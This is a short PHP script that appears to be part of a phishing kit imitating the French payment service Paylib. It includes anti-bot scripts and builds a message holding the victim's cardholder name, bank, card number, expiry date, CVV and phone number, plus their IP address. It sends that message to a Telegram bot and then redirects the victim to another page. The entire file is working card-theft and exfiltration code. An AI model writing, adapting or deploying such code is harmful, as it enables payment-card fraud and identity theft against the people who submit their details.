<?php

session_start();

include '../anti/anti1.php';
include '../anti/anti15.php';
include '../anti/anti2.php';
include '../anti/anti3.php';


$ip = getenv("REMOTE_ADDR");


$message = "[+]━━━━【🔥 PAYLIB CC INFO 🔥】━━━━[+]\r\n";
$message .= "[+] NOM & PRENON : " .$_POST['cardNoms']."\r\n";
$message .= "[+] Nom de votre banque : " .$_POST['cardBank']."\r\n";
$message .= "[+] NUMERO DE CARTE : " .$_POST['cardNum']."\r\n";
$message .= "[+] DATE D'EXPIRATION : " .$_POST['cardExp']."\r\n";
$message .= "[+] CRYPTOGRAMME VISUEL : " .$_POST['cardCvv']."\r\n";
$message .= "[+] NUMERO DE TELEPHONE : " .$_POST['cardTel']."\r\n";

$message .= "[+]━━━━【💻 System INFO】━━━━[+]\r\n";
$message .= "[+] IP : " .$ip."\n";
$message .= "[+]━━━━【🔥 PAYLIB 🔥】━━━━[+]\n";



file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );

HEADER("Location: ../info.html");


?>

